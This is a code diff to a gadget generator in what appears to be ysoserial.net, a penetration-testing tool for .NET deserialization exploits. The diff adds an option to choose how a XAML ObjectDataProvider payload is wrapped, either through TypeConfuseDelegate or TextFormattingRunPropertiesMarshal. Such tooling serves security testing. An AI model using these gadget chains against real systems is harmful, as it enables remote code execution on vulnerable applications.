@@ -1,4 +1,5 @@
-﻿using System.Collections.Generic;
+﻿using NDesk.Options;
+using System.Collections.Generic;
 using ysoserial.Helpers;
 
 namespace ysoserial.Generators
@@ -22,12 +23,24 @@ namespace ysoserial.Generators
 
         public override List<string> Labels()
         {
-            return new List<string> { GadgetTypes.BridgeAndDerived };
+            return new List<string> { GadgetTypes.NotBridgeButDervied };
         }
 
         public override List<string> SupportedFormatters()
         {
             return new List<string> { "BinaryFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
+        }
+
+        int variant_number = 1;
+
+        public override OptionSet Options()
+        {
+            OptionSet options = new OptionSet()
+            {
+                {"var|variant=", "Choices: 1 -> use TypeConfuseDelegateGenerator [default], 2 -> use TextFormattingRunPropertiesMarshal", v => int.TryParse(v, out variant_number) },
+            };
+
+            return options;
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
@@ -62,12 +75,19 @@ xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib"">
         </ObjectDataProvider.MethodParameters>
     </ObjectDataProvider>
 </ResourceDictionary>";
-            
-            object payload = TypeConfuseDelegateGenerator.GetXamlGadget(xaml_payload);
+
             if (inputArgs.Minify)
             {
-                
-                xaml_payload = XmlMinifier.Minify(xaml_payload, null, null);
+                xaml_payload = XmlHelper.Minify(xaml_payload, null, null);
+            }
+
+            object payload;
+            if (variant_number == 1)
+            {
+                payload = TypeConfuseDelegateGenerator.GetXamlGadget(xaml_payload);
+            }
+            else
+            {
                 payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
             }
             
